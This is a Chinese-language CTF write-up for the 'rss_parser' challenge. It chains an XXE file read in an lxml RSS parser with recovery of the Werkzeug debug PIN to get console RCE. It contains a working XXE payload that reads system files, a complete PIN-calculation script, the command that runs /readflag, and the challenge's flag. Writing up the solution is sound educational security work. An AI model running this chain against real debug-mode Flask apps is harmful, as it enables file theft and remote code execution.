# rss_parser

## 题目简述

题目从用户提供的 HTTP(S) 地址下载 RSS，并使用 `lxml` 解析：

```python
tree = etree.parse(
    BytesIO(content),
    etree.XMLParser(resolve_entities=True),
)
```

`resolve_entities=True` 允许解析外部实体，形成 XXE 任意文件读取。应用同时以 Flask Debug 模式运行，因此可以利用 XXE 收集 Werkzeug 调试 PIN 的计算参数，解锁调试控制台并执行 `/readflag`。

## 解题过程

### 1. 用 RSS 外部实体读取文件

服务端只检查 RSS 地址以 `http://` 或 `https://` 开头，因此需要把 XML 放在题目容器能够访问的 HTTP 服务上。将 `{FILE_PATH}` 替换为目标文件路径：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss [
  <!ENTITY xxe SYSTEM "file://{FILE_PATH}">
]>
<rss version="2.0">
  <channel>
    <title>&xxe;</title>
    <link>http://example/</link>
    <item>
      <title>test</title>
      <link>http://example/</link>
    </item>
  </channel>
</rss>
```

其中 `{FILE_PATH}` 使用以 `/` 开头的绝对路径。外部实体被放在 `<title>` 中，解析结果会直接显示在页面。Dockerfile 把 `/flag` 设为 `400` 且应用以 `app` 用户运行，所以 XXE 不能直接读取 flag；但以下用于计算调试 PIN 的文件可读：

- `/sys/class/net/eth0/address`：取得网卡 MAC 地址，再按十六进制转为十进制，即 `str(uuid.getnode())` 的值；
- `/proc/sys/kernel/random/boot_id`：本环境没有可用的 `/etc/machine-id`，Werkzeug 会退回使用 boot ID；
- `/proc/self/cgroup`：若内容为 `0::/`，末尾的容器标识为空，不需要追加到 boot ID；
- `/etc/passwd`：结合 Dockerfile 的 `USER app`，可确认运行用户为 `app`。

MAC 地址的转换方式如下：

```python
mac_decimal = str(int("02:42:c0:a8:e5:02".replace(":", ""), 16))
```

其中示例 MAC 只对应某次容器实例，实际解题必须使用当前实例通过 XXE 读到的值。

### 2. 计算 Werkzeug PIN

其余公开参数可由运行环境和报错栈确定：模块名为 `flask.app`，应用类名为 `Flask`，模块路径为 `/usr/local/lib/python3.9/site-packages/flask/app.py`。向解析器提交一份缺少必要节点的 RSS，即可触发异常并进入 Debug 报错页。

本题依赖版本使用 SHA-1 计算 PIN。把前一步读到的 `MAC_DECIMAL` 与 `BOOT_ID` 代入：

```python
import hashlib
from itertools import chain

probably_public_bits = [
    "app",
    "flask.app",
    "Flask",
    "/usr/local/lib/python3.9/site-packages/flask/app.py",
]

private_bits = [
    "MAC_DECIMAL",
    "BOOT_ID",
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode()
    h.update(bit)

h.update(b"cookiesalt")
cookie_name = "__wzd" + h.hexdigest()[:20]

h.update(b"pinsalt")
num = f"{int(h.hexdigest(), 16):09d}"[:9]

for group_size in (5, 4, 3):
    if len(num) % group_size == 0:
        pin = "-".join(
            num[i:i + group_size].rjust(group_size, "0")
            for i in range(0, len(num), group_size)
        )
        break
else:
    pin = num

print(cookie_name)
print(pin)
```

不同 Werkzeug 版本可能改用不同摘要算法；复现环境若与题目镜像不一致，应以该版本的 `werkzeug.debug.get_pin_and_cookie_name` 实现为准，不能机械套用旧版 MD5 脚本。

### 3. 解锁控制台并读取 flag

在 Debug 页面打开控制台并输入计算出的 PIN。本次实例得到的是 `524-562-666`；MAC 地址和 boot ID 变化后，PIN 也会随之变化。

Dockerfile 将 `/readflag` 设置为 setuid root，它能读取权限为 `400` 的 `/flag`。在控制台执行：

```python
__import__("subprocess").check_output(["/readflag"]).decode()
```

即可得到 flag。

```text
0xGame{67fd16b1-3aa5-4d83-8766-73264038184e}
```

## 方法总结

本题的主线是“XXE 信息读取 → Werkzeug PIN 恢复 → Debug 控制台 RCE”。XXE 无法直接越过文件权限，但可以读取 PIN 所需的低敏感度系统标识，再借调试功能完成提权读取。修复时应禁用外部实体和网络解析、关闭生产环境 Debug，并避免部署可被 Web 进程间接调用的高权限读 flag 程序。
